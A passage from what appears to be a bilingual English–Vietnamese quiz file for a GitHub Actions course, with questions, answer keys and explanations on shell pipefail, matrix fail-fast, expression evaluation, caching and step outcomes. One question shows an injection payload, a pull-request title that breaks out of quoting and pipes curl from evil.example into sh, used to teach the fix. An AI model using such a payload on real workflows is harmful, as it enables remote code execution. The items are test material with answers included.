            ) + 'Viết <code>shell: bash</code> trên một bước thì mua được gì?',
          ),
          options: [
            B(
              'A login shell, so the step inherits the runner\'s profile and can see tools that the default non-interactive shell hides from a <code>run:</code> block',
              'Một shell đăng nhập, nhờ đó bước ấy thừa hưởng profile của runner và nhìn thấy được những công cụ mà shell không tương tác mặc định giấu khỏi một khối <code>run:</code>',
            ),
            B(
              'The <code>pipefail</code> option: without it a pipeline reports the exit code of its LAST command, so a failure inside the pipe leaves the step green with the error visible in the log',
              'Tuỳ chọn <code>pipefail</code>: không có nó thì một đường ống báo mã thoát của lệnh CUỐI, nên một cú hỏng bên trong ống vẫn để bước xanh trong khi thông báo lỗi nằm ngay trong log',
            ),
            B(
              'A guarantee that the same dialect runs on all three platforms, which is its only effect — the flags are identical between the two forms and only the interpreter path changes',
              'Một bảo đảm rằng cùng một phương ngữ chạy trên cả ba nền tảng, và đó là tác dụng duy nhất — các cờ giữa hai dạng là giống hệt, chỉ đường dẫn tới trình thông dịch đổi',
            ),
            B(
              'Stricter variable handling: it adds <code>-u</code> so an unset variable stops the step, which is what turns the silent 0 above into a reported failure',
              'Xử lý biến chặt hơn: nó thêm <code>-u</code> nên một biến chưa đặt sẽ dừng bước, và đó là thứ biến con số 0 im lặng ở trên thành một cú hỏng được báo cáo',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Same script, two exit codes: 0 and 127. Under the default <code>bash -e</code>, the exit status of a pipeline is the status of its last command, and <code>tail</code> succeeded at reading nothing — so the step is green while "command not found" sits in the log where nobody looks at a passing job. Writing <code>shell: bash</code> changes the invocation to <code>bash --noprofile --norc -eo pipefail</code>, and the same run reports 127. This is the highest-value one-line change in most workflow files, and this course caught the identical trap three separate times in its own measurements — once through <code>grep</code>, once through <code>grep -c</code>, and once turning an exit 134 into an exit 0. Option 1 has it backwards: <code>--noprofile --norc</code> means <em>less</em> profile, not more. Option 3 is contradicted by the two command lines printed above. Option 4 names a flag that is not there — the form is <code>-eo pipefail</code>, not <code>-euo pipefail</code>.',
            'Cùng một script, hai mã thoát: 0 và 127. Dưới <code>bash -e</code> mặc định, trạng thái thoát của một đường ống là trạng thái của lệnh CUỐI, và <code>tail</code> đã đọc thành công cái không có gì — nên bước ấy xanh trong khi dòng "command not found" nằm ngay trong log, chỗ chẳng ai mở khi job đang đạt. Viết <code>shell: bash</code> đổi lời gọi thành <code>bash --noprofile --norc -eo pipefail</code>, và cùng lần chạy ấy báo 127. Đây là thay đổi một dòng có giá trị cao nhất trong phần lớn tệp workflow, và chính khoá học này đã bị đúng cái bẫy ấy cắn ba lần trong các phép đo của nó — một lần qua <code>grep</code>, một lần qua <code>grep -c</code>, và một lần biến exit 134 thành exit 0. Phương án 1 nói ngược: <code>--noprofile --norc</code> nghĩa là ÍT profile hơn chứ không phải nhiều hơn. Phương án 3 bị chính hai dòng lệnh in ở trên bác bỏ. Phương án 4 nêu một cờ không có ở đó — dạng ấy là <code>-eo pipefail</code>, không phải <code>-euo pipefail</code>.',
          ),
        }),

        // q16 · đáp án 3
        mcq({
          prompt: B(
            'A job declares <code>strategy.matrix</code> with <code>os: [ubuntu-latest, macos-latest, windows-latest]</code> and <code>node: [\'18\', \'20\', \'22\']</code>, and leaves <code>fail-fast</code> at its default. The macOS/Node 22 leg fails after 60 seconds. What is the state of the run?',
            'Một job khai <code>strategy.matrix</code> với <code>os: [ubuntu-latest, macos-latest, windows-latest]</code> và <code>node: [\'18\', \'20\', \'22\']</code>, và để <code>fail-fast</code> ở mặc định. Nhánh macOS/Node 22 hỏng sau 60 giây. Lần chạy đang ở trạng thái nào?',
          ),
          options: [
            B(
              'Six jobs were created and the failing one is retried once on a fresh runner, because the default strategy treats a single-leg failure as a probable infrastructure fault',
              'Sáu job được tạo ra và nhánh hỏng được thử lại một lần trên runner mới, vì chiến lược mặc định coi một nhánh hỏng đơn lẻ là một sự cố hạ tầng khả dĩ',
            ),
            B(
              'Nine jobs were created and all nine run to completion, because <code>fail-fast</code> defaults to false and only affects whether the run is marked red at the end',
              'Chín job được tạo ra và cả chín chạy tới hết, vì <code>fail-fast</code> mặc định là false và chỉ ảnh hưởng tới chuyện lần chạy có bị đánh dấu đỏ ở cuối hay không',
            ),
            B(
              'Three jobs were created — one per operating system — and the Node versions are looped inside each job, so the failure stops only the macOS leg at its second version',
              'Ba job được tạo ra — mỗi hệ điều hành một cái — và các phiên bản Node được lặp bên trong mỗi job, nên cú hỏng chỉ dừng nhánh macOS ở phiên bản thứ hai của nó',
            ),
            B(
              'Nine jobs were created, and <code>fail-fast: true</code> — the default — cancels every other leg still running, so a slow leg that was 80% done is thrown away and redone on the retry',
              'Chín job được tạo ra, và <code>fail-fast: true</code> — chính là mặc định — HUỶ mọi nhánh còn đang chạy, nên một nhánh chậm vốn đã xong 80% bị vứt đi và phải làm lại ở lần chạy lại',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Two facts, both worth having in reflex. A cross-product matrix generates one job per combination — three operating systems by three Node versions is nine real jobs on nine real machines, which is why matrices grow by multiplication while the config grows by addition. And <code>fail-fast</code> defaults to <b>true</b>: the moment any leg fails, GitHub cancels every other leg still running. Applied to this repository\'s measured timings, that default would have ended a release holding zero installers and cost 564 extra machine-seconds on the retry, because a cancelled leg has to be redone from scratch. That is why the release workflow sets <code>fail-fast: false</code>, with the reasoning written in the file: better to have two builds than none. Keep the default when the legs test one thing under different conditions and any failure invalidates the answer; turn it off when each leg produces something independently useful, when you are debugging a large matrix, or when the legs have wildly different durations.',
            'Hai sự thật, cả hai đều đáng nằm sẵn trong phản xạ. Một ma trận tích Descartes sinh ra một job cho mỗi tổ hợp — ba hệ điều hành nhân ba phiên bản Node là CHÍN job thật trên chín cỗ máy thật, và đó là lý do ma trận lớn lên theo phép NHÂN trong khi cấu hình lớn lên theo phép CỘNG. Và <code>fail-fast</code> mặc định là <b>true</b>: ngay khi một nhánh hỏng, GitHub huỷ mọi nhánh còn đang chạy. Áp vào các số đo thật của kho này, cái mặc định ấy hẳn đã kết thúc một lần phát hành với KHÔNG bản cài nào trong tay và tốn thêm 564 máy-giây ở lần chạy lại, vì một nhánh bị huỷ phải làm lại từ đầu. Vì thế workflow phát hành đặt <code>fail-fast: false</code>, và lý lẽ được viết ngay trong tệp: thà có hai bản còn hơn không bản nào. Hãy giữ mặc định khi các nhánh cùng kiểm MỘT thứ dưới các điều kiện khác nhau và một cú hỏng nào cũng làm câu trả lời vô hiệu; hãy tắt nó khi mỗi nhánh sinh ra một thứ hữu dụng độc lập, khi bạn đang gỡ một ma trận lớn, hoặc khi các nhánh dài ngắn chênh nhau nhiều.',
          ),
        }),

        /* ── Chương 3 — biểu thức, context, và lúc nào thứ gì tồn tại (6 câu) ── */

        // q17 · đáp án 2
        mcq({
          prompt: B(
            'A step is written as <code>run: echo "PR: ${{ github.event.pull_request.title }}"</code>. Somebody opens a pull request titled <code>a"; curl evil.example/x | sh; #</code>. Why does that run three commands?',
            'Một bước được viết là <code>run: echo "PR: ${{ github.event.pull_request.title }}"</code>. Ai đó mở một pull request đặt tiêu đề <code>a"; curl evil.example/x | sh; #</code>. Vì sao chuyện đó chạy ba câu lệnh?',
          ),
          options: [
            B(
              'Because the shell expands <code>${{ }}</code> at run time, and shell expansion of an untrusted value is unsafe unless the value is wrapped in single quotes',
              'Vì shell nở <code>${{ }}</code> lúc chạy, và phép nở của shell trên một giá trị không tin cậy là không an toàn trừ khi giá trị được bọc trong nháy đơn',
            ),
            B(
              'It does not — GitHub escapes shell metacharacters in every context value before substituting it, and the title would arrive as a single literal argument',
              'Nó không chạy — GitHub thoát các ký tự đặc biệt của shell trong mọi giá trị context trước khi thay thế, và tiêu đề sẽ tới nơi như một tham số nguyên văn duy nhất',
            ),
            B(
              'The expression is replaced with raw text BEFORE the runner writes the script file, so the quote and the semicolons become part of the script itself rather than part of a string in it',
              'Biểu thức bị thay bằng chữ THÔ TRƯỚC khi runner ghi tệp script, nên dấu nháy và các dấu chấm phẩy trở thành một phần của CHÍNH script chứ không phải một phần của chuỗi trong script',
            ),
            B(
              'Only under <code>pull_request_target</code>: on an ordinary <code>pull_request</code> run the event payload is redacted, so <code>github.event.pull_request.title</code> is empty for fork PRs',
              'Chỉ dưới <code>pull_request_target</code>: trong một lần chạy <code>pull_request</code> thường thì tải trọng sự kiện bị che, nên <code>github.event.pull_request.title</code> là rỗng với PR từ fork',
            ),
          ],
          correct: 2,
          explanation: EX(
            'There are two languages in a workflow file and they run at different times. GitHub\'s expression engine finds every <code>${{ ... }}</code> and replaces it with a plain string on GitHub\'s side; only then does the runner write the fully substituted text to a script file; only then does the shell run it. By that point the expression is gone — the shell never knew there was one. So <code>${{ }}</code> is not a variable, it is textual substitution into source code, and no quoting protects you, because the quoting you would write is itself part of the text being substituted into. The fix is two lines: move the value into an <code>env:</code> block and read the environment variable in the script, where the shell handles it as data. Option 4 is a dangerous half-truth: fork PRs get no secrets, but the injection still executes — and on a push run, or under <code>pull_request_target</code>, the secrets are there.',
            'Trong một tệp workflow có HAI ngôn ngữ và chúng chạy vào hai thời điểm khác nhau. Bộ máy biểu thức của GitHub tìm mọi <code>${{ ... }}</code> rồi thay bằng một chuỗi trơn, ngay ở phía GitHub; xong rồi runner mới ghi đoạn chữ đã thay đầy đủ ra một tệp script; xong rồi shell mới chạy nó. Tới lúc đó biểu thức đã biến mất — shell chưa bao giờ biết là từng có một cái. Nên <code>${{ }}</code> KHÔNG phải một biến, nó là phép thay CHỮ vào mã nguồn, và không cách đặt nháy nào che chở được bạn, vì cái nháy bạn viết chính nó cũng là một phần của đoạn chữ đang bị thay vào. Cách chữa dài hai dòng: đưa giá trị vào khối <code>env:</code> rồi đọc biến môi trường trong script, chỗ mà shell xử nó như DỮ LIỆU. Phương án 4 là một nửa sự thật nguy hiểm: PR từ fork không có bí mật, nhưng cú tiêm vẫn CHẠY — và trong một lần chạy push, hoặc dưới <code>pull_request_target</code>, thì bí mật vẫn ở đó.',
          ),
        }),

        // q18 · đáp án 0
        mcq({
          prompt: B(
            'A step references <code>${{ steps.tag.outputs.version }}</code>, but the step id was mistyped and no step with that id exists. Evaluated with GitHub\'s own expression evaluator (@actions/expressions 0.3.61), a reference into a context that is not there produces <code>kind=Null</code>, which coerces to <code>""</code>. What is the practical consequence?',
            'Một bước tham chiếu <code>${{ steps.tag.outputs.version }}</code>, nhưng id của bước bị gõ sai và không có bước nào mang id đó. Đánh giá bằng chính bộ máy biểu thức của GitHub (@actions/expressions 0.3.61), một tham chiếu vào context không tồn tại cho ra <code>kind=Null</code>, ép về chuỗi thành <code>""</code>. Hệ quả thực tiễn là gì?',
          ),
          options: [
            B(
              'The step runs with a blank argument and often succeeds at doing nothing — contexts fail by being ABSENT, not by being wrong, so there is no error to find in the log',
              'Bước ấy chạy với một tham số trống và thường THÀNH CÔNG trong việc chẳng làm gì — context hỏng theo kiểu VẮNG MẶT chứ không phải theo kiểu sai, nên không có lỗi nào để tìm trong log',
            ),
            B(
              'The workflow fails to parse and the run never starts, because every context reference is resolved against the job graph at the moment the file is read',
              'Workflow không phân giải được và lần chạy không bao giờ khởi động, vì mọi tham chiếu context được phân giải theo đồ thị job ngay lúc tệp được đọc',
            ),
            B(
              'The step fails with <code>output not found</code>, which is the runner\'s standard message for a reference to an id that has no matching step in the job',
              'Bước hỏng với thông báo <code>output not found</code>, đó là thông báo chuẩn của runner cho một tham chiếu tới id không có bước nào khớp trong job',
            ),
            B(
              'GitHub falls back to the value the same expression resolved to in the previous run of this workflow on the same branch, so the failure only appears on a first run',
              'GitHub lùi về giá trị mà chính biểu thức ấy đã phân giải ra ở lần chạy trước của workflow này trên cùng nhánh, nên cú hỏng chỉ lộ ra ở lần chạy đầu tiên',
            ),
          ],
          correct: 0,
          explanation: EX(
            'This is the single most useful debugging fact in the chapter, and it is measurable: reach into a context that is not available and you get an empty string, silently. The same is true of <code>matrix.anything</code> in a job with no matrix, of <code>needs.&lt;job&gt;</code> for a job you did not declare a dependency on, and of a reusable workflow\'s <code>secrets</code> when the caller did not pass any. The failure shape that follows is the one that survives review and is found in production: a command runs with a blank argument, exits 0, and does nothing visible. So when an expression produces nothing, check <em>where</em> you wrote it before you check <em>what</em> you wrote — and remember that the steps context needs two things you must remember to write: an <code>id:</code> on the producing step, and a write to <code>$GITHUB_OUTPUT</code>. Missing either produces the same empty string.',
            'Đây là sự thật hữu dụng nhất cho việc gỡ lỗi trong cả chương, và nó đo được: với tay vào một context không có mặt thì bạn nhận một chuỗi rỗng, trong im lặng. Điều đó cũng đúng với <code>matrix.batkycai</code> trong một job không có ma trận, với <code>needs.&lt;job&gt;</code> cho một job bạn không khai phụ thuộc, và với <code>secrets</code> của một reusable workflow khi bên gọi không truyền gì. Hình dạng cú hỏng theo sau chính là thứ sống sót qua review và bị tìm thấy trên production: một câu lệnh chạy với tham số trống, thoát 0, và không làm gì thấy được. Nên khi một biểu thức cho ra rỗng, hãy kiểm chỗ bạn VIẾT nó trước khi kiểm thứ bạn viết — và nhớ rằng context steps đòi hai thứ mà bạn phải nhớ viết: một <code>id:</code> trên bước sinh ra giá trị, và một lệnh ghi vào <code>$GITHUB_OUTPUT</code>. Thiếu một trong hai đều cho ra đúng cái chuỗi rỗng ấy.',
          ),
        }),

        // q19 · đáp án 1
        mcq({
          prompt: B(
            'Evaluated with GitHub\'s own expression evaluator, then compared with a real YAML parse of the same lines:' + code(
              "if: false      -> YAML doc ra boolean false  -> truthy=false\n" +
              "if: 'false'    -> YAML doc ra chuoi \"false\"  -> truthy=TRUE\n" +
              "if: '0'        -> chuoi \"0\"                  -> truthy=TRUE\n" +
              "if: 0          -> so 0                        -> truthy=false\n" +
              "if: ''         -> chuoi rong                  -> truthy=false",
            ) + 'Why does this particular mistake deserve its own habit?',
            'Đánh giá bằng chính bộ máy biểu thức của GitHub, rồi đối chiếu với một lượt đọc YAML thật của cùng những dòng ấy:' + code(
              "if: false      -> YAML doc ra boolean false  -> truthy=false\n" +
              "if: 'false'    -> YAML doc ra chuoi \"false\"  -> truthy=TRUE\n" +
              "if: '0'        -> chuoi \"0\"                  -> truthy=TRUE\n" +
              "if: 0          -> so 0                        -> truthy=false\n" +
              "if: ''         -> chuoi rong                  -> truthy=false",
            ) + 'Vì sao đúng cái lỗi này xứng đáng có một thói quen riêng?',
          ),
          options: [
            B(
              'Because it is the only expression mistake the workflow parser cannot report, all the others being caught at parse time and shown as an annotation on the run page',
              'Vì đó là lỗi biểu thức duy nhất mà bộ đọc workflow không báo được, mọi lỗi khác đều bị bắt lúc phân giải và hiện ra như một chú thích trên trang lần chạy',
            ),
            B(
              'Because it fails OPEN: most configuration mistakes mean something does not happen, but this one means something happens that you wrote the condition to prevent',
              'Vì nó hỏng theo hướng MỞ: phần lớn lỗi cấu hình khiến một thứ KHÔNG xảy ra, còn cái này khiến một thứ XẢY RA đúng cái thứ mà bạn viết điều kiện để ngăn',
            ),
            B(
              'Because the quoted form is evaluated by YAML rather than by the expression engine, so the step is skipped on some runner images and run on others',
              'Vì dạng có nháy được YAML tính chứ không phải bộ máy biểu thức tính, nên bước ấy bị bỏ qua trên vài ảnh runner và lại chạy trên các ảnh khác',
            ),
            B(
              'Because a quoted scalar is passed through to the shell verbatim, so <code>if: \'false\'</code> ends up as a literal argument to the step\'s command rather than as a condition',
              'Vì một scalar có nháy được chuyển thẳng tới shell nguyên văn, nên <code>if: \'false\'</code> rốt cuộc thành một tham số nguyên văn cho câu lệnh của bước chứ không phải một điều kiện',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The type of an <code>if:</code> value is decided by the YAML parser before the expression engine ever sees it. <code>false</code> arrives as a boolean and the step is skipped; <code>\'false\'</code> arrives as the non-empty string <code>false</code>, and in this language every non-empty string is true — so the step runs. One pair of quotes turns a disabled step back on, and it does it silently: the step succeeds, the job is green, and nothing in the log says a condition was misread. That asymmetry is the whole argument for the habit: any <code>if:</code> meant to disable something should be confirmed by looking at whether the step was <em>skipped</em> in a real run, not by reading the YAML. The run page shows skipped steps explicitly; the file cannot tell you. Note the same rule reaches step outputs and dispatch inputs, which are always strings: <code>if: steps.doi.outputs.co</code> is true for both <code>\'true\'</code> and <code>\'false\'</code>, so compare explicitly.',
            'Kiểu của một giá trị <code>if:</code> do bộ đọc YAML quyết định TRƯỚC khi bộ máy biểu thức kịp nhìn thấy nó. <code>false</code> tới nơi dưới dạng boolean và bước bị bỏ qua; <code>\'false\'</code> tới nơi dưới dạng chuỗi <code>false</code> khác rỗng, và trong ngôn ngữ này mọi chuỗi khác rỗng đều là ĐÚNG — nên bước ấy CHẠY. Một cặp nháy bật lại một bước vốn đã tắt, và nó làm chuyện đó trong im lặng: bước thành công, job xanh, và không dòng log nào nói rằng một điều kiện đã bị đọc nhầm. Chính cái bất đối xứng ấy là toàn bộ lý lẽ cho thói quen này: mọi <code>if:</code> viết ra để TẮT một thứ gì đó đều phải được xác nhận bằng cách nhìn xem bước ấy có BỊ BỎ QUA trong một lần chạy thật hay không, chứ không phải bằng cách đọc YAML. Trang lần chạy hiện rõ các bước bị bỏ qua; tệp thì không nói được. Lưu ý cũng luật ấy với ra tới output của bước và input của dispatch, vốn LUÔN là chuỗi: <code>if: steps.doi.outputs.co</code> đúng cho cả <code>\'true\'</code> lẫn <code>\'false\'</code>, nên phải so sánh tường minh.',
          ),
        }),

        // q20 · đáp án 3
        mcq({
          prompt: B(
            'A step has <code>continue-on-error: true</code> and it fails. A later step is added specifically to report that tolerated failure, written as <code>if: steps.x.conclusion == \'failure\'</code>. Measured with GitHub\'s evaluator on a context where <code>outcome=failure</code> and <code>conclusion=success</code>, that condition returns <code>false</code>. Why?',
            'Một bước có <code>continue-on-error: true</code> và nó hỏng. Một bước sau được thêm vào chỉ để báo cáo cú hỏng được dung thứ ấy, viết là <code>if: steps.x.conclusion == \'failure\'</code>. Đo bằng bộ máy của GitHub trên một context có <code>outcome=failure</code> và <code>conclusion=success</code>, điều kiện ấy trả về <code>false</code>. Vì sao?',
          ),
          options: [
            B(
              'Because any step after a failure is skipped regardless of its condition, and a tolerated failure is still a failure as far as the implicit <code>success()</code> is concerned',
              'Vì mọi bước sau một cú hỏng đều bị bỏ qua bất kể điều kiện của nó, và một cú hỏng được dung thứ vẫn là một cú hỏng dưới mắt <code>success()</code> ngầm định',
            ),
            B(
              'Because the reporting step would also need <code>continue-on-error: true</code> before it is allowed to observe another tolerated step\'s result',
              'Vì bước báo cáo cũng cần <code>continue-on-error: true</code> thì mới được phép quan sát kết quả của một bước dung thứ khác',
            ),
            B(
              'Because <code>conclusion</code> is only populated for jobs, not for steps, so on a step it is always the empty string and never equals any status word',
              'Vì <code>conclusion</code> chỉ có giá trị cho JOB chứ không cho bước, nên trên một bước nó luôn là chuỗi rỗng và không bao giờ bằng một từ trạng thái nào',
            ),
            B(
              '<code>continue-on-error</code> rewrites <code>conclusion</code> to <code>success</code>; the result BEFORE tolerance is <code>outcome</code>, so the condition must read <code>steps.x.outcome</code>',
              '<code>continue-on-error</code> viết lại <code>conclusion</code> thành <code>success</code>; kết quả TRƯỚC khi dung thứ nằm ở <code>outcome</code>, nên điều kiện phải đọc <code>steps.x.outcome</code>',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The two fields are defined precisely and in opposite directions: <code>outcome</code> is the result <em>before</em> <code>continue-on-error</code> is applied, and <code>conclusion</code> is the result <em>after</em>. So for a tolerated step that failed, <code>outcome</code> is <code>failure</code> and <code>conclusion</code> is <code>success</code>. Reading <code>conclusion</code> therefore gives you a condition that can never be true — and the step you added specifically to surface tolerated failures is the one step that can never run. This is one of four common conditions in this chapter that never fire; the others are <code>if: github.ref == \'main\'</code> (the value is <code>refs/heads/main</code>, and on a PR it is <code>refs/pull/N/merge</code>), <code>if: needs.x.result == \'success\'</code> where <code>x</code> is not in <code>needs:</code>, and the quoted <code>if: \'false\'</code>, which is the one that fails open instead. All four fail silently, and the only reliable detection is to look at a real run and check that the steps you expected to be skipped were skipped.',
            'Hai trường này được định nghĩa chính xác và theo hai chiều ngược nhau: <code>outcome</code> là kết quả TRƯỚC khi áp <code>continue-on-error</code>, còn <code>conclusion</code> là kết quả SAU. Nên với một bước được dung thứ mà đã hỏng thì <code>outcome</code> là <code>failure</code> còn <code>conclusion</code> là <code>success</code>. Đọc <code>conclusion</code> vì thế cho bạn một điều kiện không bao giờ đúng được — và cái bước bạn thêm vào chỉ để phơi bày các cú hỏng được dung thứ lại là bước duy nhất không bao giờ chạy. Đây là một trong bốn điều kiện phổ biến của chương này không bao giờ nổ; ba cái kia là <code>if: github.ref == \'main\'</code> (giá trị thật là <code>refs/heads/main</code>, và trên một PR thì là <code>refs/pull/N/merge</code>), <code>if: needs.x.result == \'success\'</code> khi <code>x</code> không nằm trong <code>needs:</code>, và cái <code>if: \'false\'</code> có nháy, vốn là cái hỏng theo hướng MỞ thay vì đóng. Cả bốn đều hỏng trong im lặng, và cách phát hiện đáng tin duy nhất là nhìn một lần chạy thật rồi kiểm xem những bước bạn tưởng sẽ bị bỏ qua có thật sự bị bỏ qua không.',
          ),
        }),

        // q21 · đáp án 0
        mcq({
          prompt: B(
            'A cache key is written as <code>be-cache-${{ runner.os }}-${{ hashFiles(\'pakage-lock.json\') }}</code> — note the typo. Reproducing <code>hashFiles()</code> in Node on this repository\'s real lockfiles gives:' + code(
              "hashFiles(A)          = 35be06f0884395e90c27f0645fb197221869f630848753a898594c9ab9129b70\n" +
              "hashFiles(A,B)        = 02d0a69ea11df3227cf076e33a916ceb00803fff143dd222231fec13f67e2703\n" +
              "hashFiles(B,A)        = 02d0a69ea11df3227cf076e33a916ceb00803fff143dd222231fec13f67e2703\n" +
              "khong khop file nao  -> \"\"\n" +
              "khoa sinh ra         -> be-cache-Linux-",
            ) + 'What happens to that cache?',
            'Một khoá cache được viết là <code>be-cache-${{ runner.os }}-${{ hashFiles(\'pakage-lock.json\') }}</code> — chú ý lỗi gõ. Tái lập <code>hashFiles()</code> bằng Node trên chính các lockfile thật của kho này cho ra:' + code(
              "hashFiles(A)          = 35be06f0884395e90c27f0645fb197221869f630848753a898594c9ab9129b70\n" +
              "hashFiles(A,B)        = 02d0a69ea11df3227cf076e33a916ceb00803fff143dd222231fec13f67e2703\n" +
              "hashFiles(B,A)        = 02d0a69ea11df3227cf076e33a916ceb00803fff143dd222231fec13f67e2703\n" +
              "khong khop file nao  -> \"\"\n" +
              "khoa sinh ra         -> be-cache-Linux-",
            ) + 'Chuyện gì xảy ra với cái cache đó?',
          ),
          options: [
            B(
              'The key collapses to a constant ending in a dash, so run one saves an entry and every run afterwards restores that same entry forever — a cache that never invalidates',
              'Khoá co lại thành một hằng số kết thúc bằng dấu gạch, nên lần chạy một lưu một mục và mọi lần chạy sau phục hồi đúng mục ấy mãi mãi — một cái cache không bao giờ mất hiệu lực',
            ),
            B(
              'The step fails with a glob error, which is why a typo in a <code>hashFiles</code> argument is one of the cheapest workflow mistakes to catch before merging',
              'Bước ấy hỏng với một lỗi glob, và đó là lý do một lỗi gõ trong tham số <code>hashFiles</code> là loại sai sót workflow rẻ nhất để bắt trước khi gộp',
            ),
            B(
              'The cache is disabled for that run only: an empty hash makes the action skip both restore and save, so the workflow simply runs cold every time',
              'Cache bị tắt riêng cho lần chạy đó: một hash rỗng làm action bỏ qua cả phục hồi lẫn lưu, nên workflow đơn giản là chạy lạnh mỗi lần',
            ),
            B(
              'The action falls back to hashing every file matched by the nearest valid glob in the same key, so the entry stays correct but is shared across the two lockfiles',
              'Action lùi về việc băm mọi tệp khớp với glob hợp lệ gần nhất trong cùng khoá đó, nên mục cache vẫn đúng nhưng bị dùng chung cho cả hai lockfile',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Two properties of <code>hashFiles()</code> matter here, and both are reproducible in six lines: it SHA-256s each matched file, concatenates those digests <em>as binary</em>, and SHA-256s the result over a <em>sorted</em> file list — which is why swapping the two arguments above gives the identical hash. And when nothing matches, it returns the empty string. No error, no warning. So a typo in the glob turns the key into the constant <code>be-cache-Linux-</code>, and a cache entry cannot be overwritten: whatever was stored on run one is what every future run gets, forever. The workflow gets fast, stays fast, and quietly serves a dependency tree from months ago. The tell is visible in any log — if a cache key ends in a dash, that is what happened. The same constant-key failure arrives deliberately whenever somebody writes <code>key: node-modules</code> with no hash at all.',
            'Hai tính chất của <code>hashFiles()</code> quan trọng ở đây, và cả hai đều tái lập được trong sáu dòng: nó SHA-256 từng tệp khớp được, nối các bản băm ấy DƯỚI DẠNG NHỊ PHÂN, rồi SHA-256 kết quả trên một danh sách tệp ĐÃ SẮP — và đó là lý do đảo hai tham số ở trên vẫn cho ra hash y hệt. Còn khi không khớp gì, nó trả về chuỗi RỖNG. Không lỗi, không cảnh báo. Nên một lỗi gõ trong glob biến khoá thành hằng số <code>be-cache-Linux-</code>, mà một mục cache thì KHÔNG ghi đè được: thứ được lưu ở lần chạy một chính là thứ mọi lần chạy tương lai nhận về, mãi mãi. Workflow nhanh lên, cứ nhanh mãi, và âm thầm phục vụ một cây phụ thuộc của mấy tháng trước. Dấu vết hiện ra trong bất kỳ log nào — nếu một khoá cache kết thúc bằng dấu gạch thì đó là chuyện đã xảy ra. Cũng cú hỏng khoá-hằng ấy tới một cách CỐ Ý mỗi khi ai đó viết <code>key: node-modules</code> mà không có hash nào cả.',
          ),
        }),

        // q22 · đáp án 2
        mcq({
          prompt: B(
            'Evaluated with GitHub\'s own expression evaluator:' + code(
              "inputs.version || 'latest'                                   -> \"latest\"\n" +
              "github.ref == 'refs/heads/main' && 'production' || 'staging' -> \"production\"\n" +
              "false && 'A' || 'B'                                          -> \"B\"\n" +
              "true  && ''  || 'x'                                          -> \"x\"",
            ) + 'Read the last line. What does it tell you about the <code>cond &amp;&amp; A || B</code> idiom?',
            'Đánh giá bằng chính bộ máy biểu thức của GitHub:' + code(
              "inputs.version || 'latest'                                   -> \"latest\"\n" +
              "github.ref == 'refs/heads/main' && 'production' || 'staging' -> \"production\"\n" +
              "false && 'A' || 'B'                                          -> \"B\"\n" +
              "true  && ''  || 'x'                                          -> \"x\"",
            ) + 'Hãy đọc dòng cuối. Nó nói gì về thành ngữ <code>cond &amp;&amp; A || B</code>?',
          ),
          options: [
            B(
              'That the idiom is evaluated right to left, so the fallback wins whenever it is a literal and the condition is a computed value rather than a constant',
              'Rằng thành ngữ ấy được tính từ phải sang trái, nên phương án lùi thắng mỗi khi nó là một hằng chữ và điều kiện là một giá trị tính ra chứ không phải một hằng số',
            ),
            B(
              'That the operators return booleans rather than operands, which is why the empty string was converted to <code>false</code> and the expression continued to the right-hand side',
              'Rằng các toán tử trả về boolean chứ không trả về toán hạng, và vì thế chuỗi rỗng bị chuyển thành <code>false</code> rồi biểu thức đi tiếp sang vế phải',
            ),
            B(
              'That it behaves like a ternary only while the true-branch value is truthy: an empty <code>A</code> is falsy, so <code>B</code> is returned no matter what <code>cond</code> was',
              'Rằng nó chỉ hành xử như toán tử ba ngôi CHỪNG NÀO giá trị nhánh-đúng còn truthy: một <code>A</code> rỗng là falsy, nên <code>B</code> được trả về bất kể <code>cond</code> là gì',
            ),
            B(
              'That an empty string is not a valid operand for <code>&amp;&amp;</code>, so the engine discards the whole left-hand expression and evaluates only what follows the pipes',
              'Rằng chuỗi rỗng không phải toán hạng hợp lệ của <code>&amp;&amp;</code>, nên bộ máy vứt cả vế trái đi và chỉ tính phần đứng sau hai dấu ống',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The logical operators in this language return one of their <em>operands</em>, not a boolean — which is exactly what makes <code>inputs.version || \'latest\'</code> a usable default-value idiom, as line one shows. Stack two of them and you get something that reads like <code>cond ? A : B</code> and behaves like it only while <code>A</code> is truthy. Write <code>true &amp;&amp; \'\' || \'x\'</code> and the answer is <code>x</code>, because the empty string is falsy and falls through to the right-hand side; the same trap exists with <code>0</code> and with <code>false</code>. So when the true-branch value can be empty, use an explicit <code>if:</code> on the step instead of a clever expression. Option 2 states the opposite of the measured behaviour — if the operators returned booleans, line two would have produced <code>true</code> rather than <code>production</code>. Options 1 and 4 both invent evaluation rules the four measured lines contradict.',
            'Các toán tử logic trong ngôn ngữ này trả về một TOÁN HẠNG của chúng chứ không trả về boolean — và chính điều đó khiến <code>inputs.version || \'latest\'</code> thành một thành ngữ giá-trị-mặc-định dùng được, như dòng một cho thấy. Chồng hai cái lên nhau thì bạn có một thứ đọc như <code>cond ? A : B</code> và chỉ hành xử như thế CHỪNG NÀO <code>A</code> còn truthy. Viết <code>true &amp;&amp; \'\' || \'x\'</code> thì đáp án là <code>x</code>, vì chuỗi rỗng là falsy và rơi tiếp sang vế phải; cũng cái bẫy ấy tồn tại với <code>0</code> và với <code>false</code>. Nên khi giá trị nhánh-đúng có thể rỗng, hãy dùng một <code>if:</code> tường minh trên bước thay cho một biểu thức thông minh. Phương án 2 phát biểu ngược với hành vi đo được — nếu các toán tử trả về boolean thì dòng hai đã cho ra <code>true</code> chứ không phải <code>production</code>. Phương án 1 và 4 đều bịa ra những luật đánh giá bị chính bốn dòng đo được bác bỏ.',
          ),
        }),

        /* ── Chương 4 — action, và chạy mã của người khác (5 câu) ─────────── */

        // q23 · đáp án 3
        mcq({
          prompt: B(
            'Measured on one real release run of this repository, 11.3% of all step time was spent inside <code>uses:</code> steps rather than inside <code>run:</code> steps. What is a <code>uses:</code> step actually doing on the runner?',
            'Đo trên một lần chạy phát hành THẬT của kho này, 11,3% tổng thời gian các bước trôi qua bên trong các bước <code>uses:</code> chứ không phải bên trong các bước <code>run:</code>. Một bước <code>uses:</code> thật ra đang làm gì trên runner?',
          ),
          options: [
            B(
              'Calling a sandboxed function that can only read the inputs you passed in <code>with:</code> and write the outputs it declared in its own <code>action.yml</code>',
